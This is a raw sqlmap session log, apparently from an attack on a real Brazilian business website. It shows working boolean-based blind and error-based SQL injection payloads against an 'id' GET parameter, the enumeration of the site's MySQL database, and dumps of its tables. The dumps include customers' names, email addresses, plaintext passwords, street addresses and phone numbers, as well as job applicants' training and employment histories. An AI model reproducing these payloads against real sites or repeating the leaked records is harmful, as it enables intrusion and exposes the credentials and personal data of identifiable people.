@@ -1,0 +1,837 @@
+sqlmap identified the following injection point(s) with a total of 346 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (8158=8158) THEN 94 ELSE (SELECT 7459 UNION SELECT 1076) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=94 AND (SELECT 5404 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(5404=5404,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] alvesmad_bd
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (8158=8158) THEN 94 ELSE (SELECT 7459 UNION SELECT 1076) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=94 AND (SELECT 5404 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(5404=5404,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (8158=8158) THEN 94 ELSE (SELECT 7459 UNION SELECT 1076) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=94 AND (SELECT 5404 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(5404=5404,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+Database: alvesmad_bd
+[40 tables]
++----------------------+
+| arquivos             |
+| cadastros            |
+| categorias           |
+| categorias_2         |
+| compras_produtos     |
+| config_arquivos      |
+| config_atendimento   |
+| config_categorias    |
+| config_categorias_2  |
+| config_clientes      |
+| config_curriculos    |
+| config_dicas         |
+| config_email         |
+| config_equipamentos  |
+| config_especialidade |
+| config_eventos       |
+| config_fornecedores  |
+| config_infraestrut   |
+| config_mala          |
+| config_marcas        |
+| config_noticias      |
+| config_paisagismo    |
+| config_portifolio    |
+| config_produtos      |
+| config_usuarios      |
+| cur_cur              |
+| cur_exp              |
+| curriculos           |
+| dicas                |
+| emails               |
+| especialidade        |
+| eventos              |
+| eventos_fotos        |
+| marcas               |
+| modulos              |
+| paisagismo           |
+| produtos             |
+| produtos_fotos       |
+| produtos_informacoes |
+| usuarios             |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (8158=8158) THEN 94 ELSE (SELECT 7459 UNION SELECT 1076) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=94 AND (SELECT 5404 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(5404=5404,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.35
+back-end DBMS: MySQL >= 5.0
+Database: alvesmad_bd
+[40 tables]
++----------------------+
+| arquivos             |
+| cadastros            |
+| categorias           |
+| categorias_2         |
+| compras_produtos     |
+| config_arquivos      |
+| config_atendimento   |
+| config_categorias    |
+| config_categorias_2  |
+| config_clientes      |
+| config_curriculos    |
+| config_dicas         |
+| config_email         |
+| config_equipamentos  |
+| config_especialidade |
+| config_eventos       |
+| config_fornecedores  |
+| config_infraestrut   |
+| config_mala          |
+| config_marcas        |
+| config_noticias      |
+| config_paisagismo    |
+| config_portifolio    |
+| config_produtos      |
+| config_usuarios      |
+| cur_cur              |
+| cur_exp              |
+| curriculos           |
+| dicas                |
+| emails               |
+| especialidade        |
+| eventos              |
+| eventos_fotos        |
+| marcas               |
+| modulos              |
+| paisagismo           |
+| produtos             |
+| produtos_fotos       |
+| produtos_informacoes |
+| usuarios             |
++----------------------+
+
+Database: alvesmad_bd
+Table: arquivos
+[2 entries]
++--------+------------+----------+----------------------------------+-------------+------------+-------------------------+
+| arq_id | id_usuario | arq_tipo | arq_desc                         | arq_link    | arq_data   | arq_nome                |
++--------+------------+----------+----------------------------------+-------------+------------+-------------------------+
+| 66     | 0          | <blank>  | Testando o envio de arquivos.    | 5533440.gz  | 2013-03-04 | Testando                |
+| 67     | 49         | <blank>  | Teste de arquivo em formato .zip | 5551745.zip | 2013-03-04 | Arquivo em formato .zip |
++--------+------------+----------+----------------------------------+-------------+------------+-------------------------+
+
+Database: alvesmad_bd
+Table: cadastros
+[3 entries]
++--------+---------------+------------+----------+----------+-----------------------------+-----------+------------+------------+--------------+-------------+---------------+----------------------------------------+-------------------+
+| cad_id | cad_cidade    | cad_cep    | cad_nome | cad_tipo | cad_email                   | cad_senha | cad_status | cad_bairro | cad_estado   | cad_celular | cad_telefone  | cad_endereco                           | cad_sobrenome     |
++--------+---------------+------------+----------+----------+-----------------------------+-----------+------------+------------+--------------+-------------+---------------+----------------------------------------+-------------------+
+| 49     | Montes Claros | 39400-000  | Deivid   | cliente  | deivid@agbrasilweb.com.br   | 123456    | 0          | <blank>    | MG           | <blank>     | <blank>       | rua a, 60                              | Dias              |
+| 69     | Montes Claros | 39.400-115 | Farlley  | cliente  | farlley@agbrasilweb.com.br  | 881988    | 0          | <blank>    | Minas Gerais | <blank>     | (38)9127-6974 | Rua Santa Maria, 544 - Todos os Santos | Barbosa Gonçalves |
+| 71     | Montes Claros | 39.403-200 | Raphaela | cliente  | raphaela@agbrasilweb.com.br | 123456    | 0          | <blank>    | Minas Gerais | <blank>     | (38)3212-0157 | Rua São Marcos,131 - Todos os Santos   | Mota              |
++--------+---------------+------------+----------+----------+-----------------------------+-----------+------------+------------+--------------+-------------+---------------+----------------------------------------+-------------------+
+
+Database: alvesmad_bd
+Table: categorias
+[17 entries]
++--------+-------------+----------------+----------+----------+-----------+-----------+
+| cat_id | cat_idnivel | cat_nome       | cat_foto | cat_desc | cat_nivel | cat_ordem |
++--------+-------------+----------------+----------+----------+-----------+-----------+
+| 47     | 0           | Tábuas         | <blank>  | <blank>  | 2         | 0         |
+| 73     | 0           | Caibros        | <blank>  | <blank>  | 2         | 0         |
+| 77     | 0           | Portas         | <blank>  | <blank>  | 2         | 0         |
+| 80     | 0           | Ripa           | <blank>  | <blank>  | 2         | 0         |
+| 81     | 0           | Ripão          | <blank>  | <blank>  | 2         | 0         |
+| 82     | 0           | Peças 5x10     | <blank>  | <blank>  | 2         | 0         |
+| 83     | 0           | Peças 6x12     | <blank>  | <blank>  | 2         | 0         |
+| 84     | 0           | Forro          | <blank>  | <blank>  | 2         | 0         |
+| 85     | 0           | Assoalho       | <blank>  | <blank>  | 2         | 0         |
+| 86     | 0           | Prego          | <blank>  | <blank>  | 2         | 0         |
+| 87     | 0           | Castilho       | <blank>  | <blank>  | 2         | 0         |
+| 88     | 0           | Alisar         | <blank>  | <blank>  | 2         | 0         |
+| 89     | 0           | Cimalha        | <blank>  | <blank>  | 2         | 0         |
+| 90     | 0           | Quadrado 15x15 | <blank>  | <blank>  | 2         | 0         |
+| 93     | 0           | a              | <blank>  | <blank>  | 2         | 0         |
+| 94     | 0           | ??oi           | <blank>  | <blank>  | 2         | 0         |
+| 95     | 0           | dasdasdasdsad  | <blank>  | <blank>  | 2         | 0         |
++--------+-------------+----------------+----------+----------+-----------+-----------+
+
+Database: alvesmad_bd
+Table: categorias_2
+[1 entry]
++--------+-------------+------------------+----------+----------+-----------+-----------+
+| cat_id | cat_idnivel | cat_nome         | cat_foto | cat_desc | cat_nivel | cat_ordem |
++--------+-------------+------------------+----------+----------+-----------+-----------+
+| 38     | 0           | Portas e Portais | <blank>  | <blank>  | 0         | 0         |
++--------+-------------+------------------+----------+----------+-----------+-----------+
+
+Database: alvesmad_bd
+Table: compras_produtos
+[2 entries]
++----+--------+--------+---------+
+| id | pro_id | com_id | pro_qtd |
++----+--------+--------+---------+
+| 8  | 2      | 1      | 2       |
+| 12 | 32     | 11     | 0       |
++----+--------+--------+---------+
+
+Database: alvesmad_bd
+Table: config_arquivos
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Arquivos  | arquivos  |
++-----------+-----------+
+
+Database: alvesmad_bd
+Table: config_atendimento
+[1 entry]
++-------------+-----------------+
+| conf_nome   | conf_link       |
++-------------+-----------------+
+| Atendimento | fotos_eve&eve=1 |
++-------------+-----------------+
+
+Database: alvesmad_bd
+Table: config_categorias
+[2 entries]
++--------------+------------+------------+------------+------------+------------------+--------------------+
+| conf_nome    | conf_link  | conf_mdesc | conf_nivel | conf_mfoto | conf_nome_plural | conf_nome_singular |
++--------------+------------+------------+------------+------------+------------------+--------------------+
+| Produtos     | categorias | 1          | 2          | 1          | categorias       | categoria          |
+| Subcategoria | categorias | 2          | 2          | 2          | subcategorias    | subcategoria       |
++--------------+------------+------------+------------+------------+------------------+--------------------+
+
+Database: alvesmad_bd
+Table: config_categorias_2
+[2 entries]
++------------------+--------------+------------+------------+------------+------------------+--------------------+
+| conf_nome        | conf_link    | conf_mdesc | conf_nivel | conf_mfoto | conf_nome_plural | conf_nome_singular |
++------------------+--------------+------------+------------+------------+------------------+--------------------+
+| Portas e Portais | categorias_2 | 1          | 2          | 1          | categorias       | categoria          |
+| Subcategorias    | categorias_2 | 2          | 1          | 2          | subcategorias    | subcategoria       |
++------------------+--------------+------------+------------+------------+------------------+--------------------+
+
+Database: alvesmad_bd
+Table: config_clientes
+[1 entry]
++-----------+-----------------------+
+| conf_nome | conf_link             |
++-----------+-----------------------+
+| Clientes  | fotos_eve&eve=2&cat=5 |
++-----------+-----------------------+
+
+Database: alvesmad_bd
+Table: config_curriculos
+[1 entry]
++------------+------------+
+| conf_nome  | conf_link  |
++------------+------------+
+| Curriculos | curriculos |
++------------+------------+
+
+Database: alvesmad_bd
+Table: config_dicas
+[1 entry]
++-----------+-------------+
+| conf_nome | conf_link   |
++-----------+-------------+
+| Dicas     | dicas&cat=0 |
++-----------+-------------+
+
+Database: alvesmad_bd
+Table: config_email
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Emails    | mala      |
++-----------+-----------+
+
+Database: alvesmad_bd
+Table: config_equipamentos
+[1 entry]
++--------------+---------------+
+| conf_nome    | conf_link     |
++--------------+---------------+
+| Equipamentos | eventos&cat=3 |
++--------------+---------------+
+
+Database: alvesmad_bd
+Table: config_especialidade
+[0 entries]
++-----------+-------------+
+| conf_link | config_nome |
++-----------+-------------+
++-----------+-------------+
+
+Database: alvesmad_bd
+Table: config_eventos
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Galeria   | eventos   |
++-----------+-----------+
+
+Database: alvesmad_bd
+Table: config_fornecedores
+[1 entry]
++--------------+--------------+
+| conf_nome    | conf_link    |
++--------------+--------------+
+| Fornecedores | fornecedores |
++--------------+--------------+
+
+Database: alvesmad_bd
+Table: config_infraestrut
+[1 entry]
++-----------------+------------------+
+| conf_nome       | conf_link        |
++-----------------+------------------+
+| Infra-estrutura | fotos_eve&eve=11 |
++-----------------+------------------+
+
+Database: alvesmad_bd
+Table: config_mala
+[1 entry]
++------------+---------------------------------+
+| conf_nome  | conf_link                       |
++------------+---------------------------------+
+| NewsLetter | produtos&nivel=0&cat=35&catid=2 |
++------------+---------------------------------+
+
+Database: alvesmad_bd
+Table: config_marcas
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Parceiros | marcas    |
++-----------+-----------+
+
+Database: alvesmad_bd
+Table: config_noticias
+[1 entry]
++--------------+-------------+
+| conf_nome    | conf_link   |
++--------------+-------------+
+| Informativos | dicas&cat=1 |
++--------------+-------------+
+
+Database: alvesmad_bd
+Table: config_paisagismo
+[1 entry]
++----------+-----------+-----------+------------+------------+------------+
+| conf_img | conf_desc | conf_info | conf_nome  | conf_link  | conf_fotos |
++----------+-----------+-----------+------------+------------+------------+
+| 2        | 2         | 2         | Paisagismo | paisagismo | 2          |
++----------+-----------+-----------+------------+------------+------------+
+
+Database: alvesmad_bd
+Table: config_portifolio
+[1 entry]
++-----------+---------------+
+| conf_nome | conf_link     |
++-----------+---------------+
+| Galeria   | eventos&cat=2 |
++-----------+---------------+
+
+Database: alvesmad_bd
+Table: config_produtos
+[1 entry]
++----------+-----------+-----------+-------------+------------------+------------+
+| conf_img | conf_desc | conf_info | conf_nome   | conf_link        | conf_fotos |
++----------+-----------+-----------+-------------+------------------+------------+
+| 2        | 2         | 2         | Lancamentos | produtos&catid=5 | 2          |
++----------+-----------+-----------+-------------+------------------+------------+
+
+Database: alvesmad_bd
+Table: config_usuarios
+[1 entry]
++-----------+-----------+
+| conf_nome | conf_link |
++-----------+-----------+
+| Usuarios  | usuarios  |
++-----------+-----------+
+
+Database: alvesmad_bd
+Table: cur_cur
+[67 entries]
++--------+----------------------------------------------+---------+--------------------+-------------------------+------------------------------------------------+
+| cus_id | cus_ent                                      | cus_cur | cus_car            | cus_per                 | cus_nome                                       |
++--------+----------------------------------------------+---------+--------------------+-------------------------+------------------------------------------------+
+| 4      | SEBRAE                                       | 6       | 44 HR              | <blank>                 | ADIMINISTRACAO FINANCEIRA                      |
+| 5      | FREE WAY INFORMATICA                         | 6       | <blank>            | <blank>                 | INFORMATICA BASICA                             |
+| 8      | soter                                        | 9       | 1 ano e 08 meses   | 2009                    | tecnico em segurança do trabalho               |
+| 9      | futuro informatica                           | 9       | 72 hs              | 2004                    | informatica basica                             |
+| 10     | <blank>                                      | 9       | 72hs               | <blank>                 | recepcionista; telemarketing                   |
+| 11     | <blank>                                      | 9       | 72hs               | <blank>                 | auxiliar administrativo                        |
+| 12     | SOPHIE LINK                                  | 10      | 160H               | 5 MESES                 | GESTÃO DE PESSOAS                              |
+| 13     | SOPHIE LINK                                  | 10      | 160H               | 5 MESES                 | GESTÃO FINANCEIRA                              |
+| 14     | TECNET                                       | 10      | 120H               | 6 MESES                 | INFORMÁTICA                                    |
+| 15     | PRONAC                                       | 10      | <blank>            | 3 MESES                 | SECRETARIADO EXECUTIVO                         |
+| 18     | Bit Company                                  | 12      | <blank>            | 2006 a 2007             | Qualificaçao em Administraçao e Informática    |
+| 19     | Bit Company                                  | 13      | <blank>            | 2006 a 2007             | Qualificaçao em Administraçao e Informática    |
+| 20     | Unama                                        | 13      | <blank>            | 2009 á 2010             | Gestao Empresarial                             |
+| 21     | INFAMOR                                      | 14      | 150                | 2007                    | Informática Básica e Avançada                  |
+| 22     | ESCOLAS CCI                                  | 14      | 50                 | 2004                    | Montagem e manutenção de Micros                |
+| 23     | Fundanção Getúlio Vargas                     | 14      | 15                 | 2009                    | Motivação nas empresas                         |
+| 24     | Fundanção Getúlio Vargas                     | 14      | 15                 | 2009                    | RH                                             |
+| 25     | SEBRAE                                       | 14      | 35                 | 2006                    | Analise e planejamento financeiro              |
+| 26     | senai                                        | 15      | 1,600              | 03/03/2003/a 20/12/2004 | Eletricista geral                              |
+| 27     | EXCLUSIVA                                    | 15      | 40                 | 15/06/2007/a 07/08/2007 | NR10                                           |
+| 28     | SOTER                                        | 16      | um ano e meio      | <blank>                 | Técnico em Meio Ambiente                       |
+| 30     | SENAI/ VALE                                  | 18      | 572 HORAS          | 04/08/08 À 03/11/08     | OPERAÇÃO DE MINA.                              |
+| 31     | OBRA KOLPING                                 | 18      | 120 HORAS          | 02/07/07 À 25/07/07     | MECANICA PESADA                                |
+| 32     | OBRA KOLPING                                 | 18      | 350 HORAS          | 15/01/07 À 30/06/07     | MECANICA DE AUTOS                              |
+| 33     | Bit company                                  | 19      | 120                | 2006                    | Qualificação em administração                  |
+| 34     | Bit company                                  | 19      | 120                | 2006                    | qualificação em informática                    |
+| 35     | Ematel Informática                           | 20      | 60                 | 2003                    | informática básica                             |
+| 36     | <blank>                                      | 20      | <blank>            | <blank>                 | Atendimento ao cliente                         |
+| 37     | Ematel Informática                           | 21      | 60                 | 2003                    | Informática Básica                             |
+| 38     | sebrae                                       | 21      | 20                 | 2008                    | Exelencia no Atendimeto                        |
+| 39     | Objetivo                                     | 22      | 62                 | 2010                    | Informática                                    |
+| 40     | Senai                                        | 23      | <blank>            | <blank>                 | Informatica Básica                             |
+| 41     | T&T Informática                              | 23      | <blank>            | Cursando                | Informática Avançada                           |
+| 42     | T&T Informática                              | 23      | <blank>            | Cursando                | Capacitação Proficional                        |
+| 43     | universidade Corporativa Banco do Brasil     | 24      | 40 horas           | 04 a 09/07/2007         | Relações Jurídico-Negociais                    |
+| 44     | Universidade Corporativa Banco               | 24      | 40 horas           | 29/05 a 02/06/2000      | Excelência Profissional                        |
+| 45     | universidade Corporativa Banco do Brasil     | 25      | 40 horas           | 04 a 09/07/2007         | Relações Jurídico-Negociais                    |
+| 46     | Universidade Corporativa Banco do            | 25      | 40 horas           | 29/05 a 02/06/2000      | Excelência Profissional                        |
+| 47     | ESCOLA DE IDIOMAS FISK                       | 28      | <blank>            | CONCLUIDO EM 06/1997    | INGLÊS AVANÇADO                                |
+| 48     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | 29/05 a 02/06/2000      | Excelência Profissional                        |
+| 49     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | DIREITOS DO CONSUMIDOR                         |
+| 50     | Universidade Corporativa Banco do Brasil     | 28      | 60 horas           | <blank>                 | Fundamentos e Práticas da Gestão Contemporânea |
+| 51     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | Gestão de Desenvolvimento por Competências     |
+| 52     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | Gestão com equipes                             |
+| 53     | ACIP/Rocha Filho Consultoria Empresarial     | 28      | 40 horas           | <blank>                 | Formação de Gerentes                           |
+| 54     | <blank>                                      | 28      | 40 horas           | <blank>                 | Certificação Anbid - CPA 10                    |
+| 55     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | Relações Jurídico-Negociais                    |
+| 56     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | Certificação - Inglês Básico                   |
+| 57     | Universidade Corporativa Banco do Brasil     | 28      | 40 horas           | <blank>                 | Segurança da Informação                        |
+| 58     | Universidade Corporativa Banco do Brasil     | 28      | 40                 | <blank>                 | Gente que atende Gente                         |
+| 59     | Bit Company - Parauapebas - PA               | 29      | <blank>            | JAN/2009 a JUL/2010     | Tec. Administração e Negócios                  |
+| 60     | Microdados Informatica                       | 30      | 4 por semana       | 1 ANO                   | CURSO DE INFORMATICA BASICO E AVANÇADO         |
+| 61     | SEU SUCESSO COMEÇA AQUI                      | 30      | 2 HORAS POR SEMANA | 14 MESES                | SECRETARIADO                                   |
+| 62     | ETB                                          | 31      | <blank>            | 2005                    | TELECOMUNICAÇÕES                               |
+| 63     | 20/03/2008                                   | 32      | 72 HORAS           | 30/07/2007              | INFORMÁTICA BÁSICA                             |
+| 64     | MICROLINS                                    | 32      | 72 HORAS           | 05/04/2008 Á 05/11/2008 | ROTINAS ADMINSTRATIVAS                         |
+| 65     | SEBRAE                                       | 33      | 90 horas           | 2002                    | EMPRETEC                                       |
+| 66     | SENAC                                        | 33      | 30 HORAS           | 2004                    | NOÇÕES DE SECRETARIADO                         |
+| 67     | SENAC                                        | 33      | 30 HORAS           | 2004                    | LEGISLAÇÃO TRABALHISTA E PREVIDENCIÁRIA        |
+| 68     | SENAC                                        | 33      | 30 HORAS           | 2004                    | REDAÇÃO EMPRESARIAL                            |
+| 69     | SENAC                                        | 33      | 30 HORAS           | 2004                    | HABILIDADES GERENCIAIS                         |
+| 70     | SENAC                                        | 34      | <blank>            | <blank>                 | Informática avançada                           |
+| 71     | escola soter                                 | 35      | <blank>            | 18 meses                | tecnico em meio ambiente                       |
+| 72     | afazendinha                                  | 35      | <blank>            | <blank>                 | Informatica                                    |
+| 73     | ccaa                                         | 35      | <blank>            | 4 anos                  | Inglês                                         |
+| 74     | ctp                                          | 35      | <blank>            | 09 meses                | Montagem e manutenção de computadores          |
+| 75     | SOTER-SIETEMA ORGANIZACIONAL TECNICO REGULAR | 36      | NOITE              | 18 MESES                | TECNICA ELETROMECANICA                         |
++--------+----------------------------------------------+---------+--------------------+-------------------------+------------------------------------------------+
+
+Database: alvesmad_bd
+Table: cur_exp
+[112 entries]
++--------+---------+-------------------------+------------------------------------------+-------------------------------------------------+--------------------------------------------------------------------------------------------------+
+| exp_id | exp_cur | exp_per                 | exp_car                                  | exp_emp                                         | exp_fun                                                                                          |
++--------+---------+-------------------------+------------------------------------------+-------------------------------------------------+--------------------------------------------------------------------------------------------------+
+| 2      | 4       | vespertino              | contador                                 | senac                                           | contar                                                                                           |
+| 4      | 6       | <blank>                 | ASSISTENTE FINANCEIRO                    | CONSTRUTORA NORBERTO ODEBRECHT S/A              | ASSISTENTE FINANCEIRO                                                                            |
+| 5      | 6       | 05/2007 A 12/2008       | CONTROLLER FINANCEIRO                    | ATRIUM CONFORTS HOTEL                           | ASSITENTE FINANCEIRO                                                                             |
+| 6      | 7       | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 9      | 9       | 2004                    | AUXILIAR ADMNISTRATIVO                   | DRC AUTOMOVEIS                                  | <blank>                                                                                          |
+| 10     | 10      | 5 MESES                 | AUXILIAR ADMINISTRATIVO                  | NORTE QUALIDADE                                 | DIGITADORA                                                                                       |
+| 12     | 11      | <blank>                 | aux. adm                                 | Novo Espaço                                     | rh                                                                                               |
+| 13     | 11      | <blank>                 | aux.adm                                  | Contruforte                                     | serviços de banco                                                                                |
+| 14     | 12      | 2006 a 2007             | Auxiliar Pedagogica                      | Neca                                            | Auxiliar Pedagógica                                                                              |
+| 15     | 13      | 2009 á 2010             | Auxiliar Pedagogica                      | Neca                                            | Auxiliar Pedagógica                                                                              |
+| 16     | 14      | 2007                    | Instrutor de informatica                 | InfAmor                                         | Ministrar aulas de informática                                                                   |
+| 18     | 14      | 2009                    | CPD (Centro de Processamento de Dados)   | EQUATORIAL ALIMENTOS                            | Manutenção                                                                                       |
+| 19     | 15      | 03/03/2003/a 20/12/2004 | Eletricista de manutenção                | Maquipesa Serviços Ltda                         | Eletricista                                                                                      |
+| 20     | 15      | 15/06/2007/a 07/08/2007 | Eletricista F/C                          | Consorcio Mendes Junior e Parex                 | Eletricista                                                                                      |
+| 21     | 16      | <blank>                 | Técnico em Meio Ambiente                 | Hidelma Engenharia e Manutenção                 | Técnico em Meio Ambiente                                                                         |
+| 22     | 17      | 2007 \xc3  2008         | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 23     | 17      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 24     | 17      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 25     | 18      | 04/08/08 À 03/11/08     | ELETRICISTA                              | RIP SERVIÇOS INDUSTRIAIS S/A                    | AJUDANTE DE ELÉTRICA                                                                             |
+| 26     | 18      | 02/07/07 À 25/07/07     | LAVADOR DE EQUIP. DE MINA                | DAN-HEBERT                                      | LAVADOR                                                                                          |
+| 27     | 19      | 2006                    | Auxiliar administrativo                  | Prefeitura municipal de Parauapebas             | auxiliar                                                                                         |
+| 28     | 20      | 2003                    | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 29     | 21      | 2003                    | operadora de caixa                       | Leolar eletro doméstico                         | caixa                                                                                            |
+| 30     | 21      | 2008                    | vendedora                                | Borges Infomática                               | vendas                                                                                           |
+| 31     | 21      | 2003 á 2004             | operadora de caixa                       | SMS celulares ( OI )                            | caixa                                                                                            |
+| 32     | 21      | 2005 á 2006             | vendedora                                | G.Alves fero e aço                              | vendedora, construção civil e serralheria                                                        |
+| 33     | 21      | 2007                    | Operadora de Caixa                       | Executiva RH                                    | caixa                                                                                            |
+| 34     | 22      | 2010                    | Montagem                                 | Waytec                                          | Montadora de monitores                                                                           |
+| 35     | 23      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 36     | 24      | 04 a 09/07/2007         | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 38     | 28      | CONCLUIDO EM 06/1997    | Professor                                | Escola de Idiomas FISK - Parauapebas (PA)       | Professor de Inglês                                                                              |
+| 69     | 43      | 18 meses                | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 70     | 44      | 17/07/2007 a 31/08/2007 | Aux.Soldador                             | Torneadora Santa Clara                          | Aux.Soldador                                                                                     |
+| 71     | 45      | 10/05/1999-16/09/1999   | Instrutor de Informática                 | T & T Informática                               | Lecionar                                                                                         |
+| 72     | 45      | 08/02/2010 - 14/04/2010 | Instrutor de Informática                 | Colégio Príncipe da Paz                         | Lecionar                                                                                         |
+| 73     | 45      | 09/2009 - 11/2009       | Instrutor de Informática                 | Qualifica Informática                           | Lecionar                                                                                         |
+| 74     | 45      | 11/2008 = 08/2009       | Aux. Administrativo                      | Secretaria Municipal de Agricultura de Viana-MA | Digitador                                                                                        |
+| 75     | 45      | 02/2006 - 03/2007       | Instrutor de Informática                 | Laboratório Municipal de Informática            | Lecionar                                                                                         |
+| 76     | 45      | 06/2005 - 12/2005       | Instrutor de Informática                 | DJ Informática                                  | Lecionar                                                                                         |
+| 77     | 45      | 04/2003 -07/2003        | Instrutor de Informática                 | Delta informática                               | Lecionar                                                                                         |
+| 78     | 46      | 2009                    | Administrativo                           | Farmacia Brasil                                 | Controle Financeiro e Caixa                                                                      |
+| 79     | 46      | 2005                    | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 80     | 47      | <blank>                 | Analista de Otimização                   | Laboratório Teuto Brasileiro S/A                | <blank>                                                                                          |
+| 82     | 48      | 2002                    | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 83     | 48      | 2007                    | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 84     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 85     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 86     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 87     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 88     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 89     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 90     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 91     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 92     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 93     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 94     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 95     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 96     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 97     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 98     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 99     | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
